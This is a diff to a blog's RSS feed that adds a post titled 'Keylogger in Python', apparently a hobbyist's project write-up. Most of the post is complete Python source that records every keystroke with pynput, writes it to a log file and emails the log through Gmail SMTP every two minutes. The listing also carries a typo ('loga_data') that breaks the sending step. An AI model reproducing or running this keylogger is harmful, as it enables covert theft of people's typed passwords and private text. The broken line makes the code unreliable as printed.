@@ -7,11 +7,88 @@
     
     <language>en</language>
     <copyright>Copyright 2025, Calvin Tran</copyright>
-    <lastBuildDate>Wed, 18 Jun 2025 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 28 Jul 2025 00:00:00 +0000</lastBuildDate>
     <generator>Hugo - gohugo.io</generator>
     <docs>http://cyber.harvard.edu/rss/rss.html</docs>
     <atom:link href="https://rajkive.github.io//atom.xml" rel="self" type="application/atom+xml"/>
     
+    
+    <item>
+      <title>Keylogger in Python</title>
+      <link>https://rajkive.github.io/posts/py-keylogger/</link>
+      <description>&lt;h2 id=&#34;keylogger-in-python---a-passion-project-sort-of&#34;&gt;Keylogger in Python - A passion project (sort of)&lt;/h2&gt;
+&lt;p&gt;I tried my hands on making a keylogger, fully in python, and I learnt a &lt;strong&gt;lot&lt;/strong&gt;! The inspiration behind this project is Grant Collin&amp;rsquo;s video on trying to make one. I followed his foot-steps for the structure but the implementation was purely from my thought process.&lt;/p&gt;
+&lt;p&gt;Link to the project: &lt;a href=&#34;https://github.com/rajkive/py-key-logger&#34;&gt;https://github.com/rajkive/py-key-logger&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;what-is-a-keylogger&#34;&gt;What is a Keylogger?&lt;/h3&gt;
+&lt;p&gt;A keylogger is a program that records every keystroke made on a keyboard. In this project, your keylogger will:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Capture keystrokes&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Store them temporarily&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Send them to your email every 120 seconds (2 minutes)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There are some pre-requisites for this project. Mainly these dependencies: &lt;code&gt;pynput.keyboard, threading, smtplib, subprocess&lt;/code&gt; It is good to have some knowledge of the syntax and how they work but if not, then this is the perfect opportunity to get familiar with it.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The general flow for the program was fairly simple. Set-up email configurations -&amp;gt; Implement function to start capturing keystrokes -&amp;gt; Send logs via email -&amp;gt; using timer for repeated execution.&lt;/p&gt;
+&lt;p&gt;I tried to keep it simple and code the basic functionalities for each step. The only problem I encounterd was with smpt config for google. If you are using a gmail for this set-up there might be some problems with 2-factor auth or passkeys if the option is enabled. To debug it, I used a temp email for the reveiver and an Ethereal Email which create a free fake SMTP service for developers.&lt;/p&gt;
+&lt;p&gt;Overall this was a very fun project to do and took less than 2hrs. It was a good intro to lots of concepts essential for cyber and networking.&lt;/p&gt;
+&lt;h4 id=&#34;code&#34;&gt;Code:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import subprocess, smtplib, threading
+from pynput.keyboard import Key, Listener
+
+sender_email = &amp;#34;sender-example@gmail.com&amp;#34;
+sender_password = &amp;#34;12345678&amp;#34;
+receiver_email = &amp;#34;example@gmail.com&amp;#34;
+open(&amp;#34;log.txt&amp;#34;, &amp;#34;a&amp;#34;).close()
+
+def logging(key):
+    try:
+        log = key.char
+    except AttributeError:
+        if key == Key.space:
+            log = &amp;#39; &amp;#39;
+        elif key == Key.enter:
+            log = &amp;#39;\n&amp;#39;
+        elif key == Key.tab:
+            log = &amp;#39;\t&amp;#39;
+        else:
+            log = f&amp;#39; [{key.name}] &amp;#39;
+
+    with open(&amp;#34;log.txt&amp;#34;, &amp;#34;a&amp;#34;) as f:
+        f.write(log)
+
+
+def send_mail():
+    with open(&amp;#34;log.txt&amp;#34;, &amp;#34;r&amp;#34;) as file:
+        log_data = file.read()
+        
+    with smtplib.SMTP(&amp;#34;smtp.gmail.com&amp;#34;, 587) as server:
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, receiver_email, loga_data)
+        
+
+    # clear the file after sending the email
+    with open(&amp;#34;log.txt&amp;#34;, &amp;#34;w&amp;#34;) as file:
+        file.write(&amp;#34;&amp;#34;)
+    
+    threading.Timer(120, send_mail).start()
+    
+send_mail()
+
+with Listener(on_press=logging) as listener:
+    listener.join()
+&lt;/code&gt;&lt;/pre&gt;</description>
+      <author>rajkive</author>
+      <guid>https://rajkive.github.io/posts/py-keylogger/</guid>
+      <pubDate>Mon, 28 Jul 2025 00:00:00 +0000</pubDate>
+    </item>
     
     <item>
       <title>Hugo be like</title>
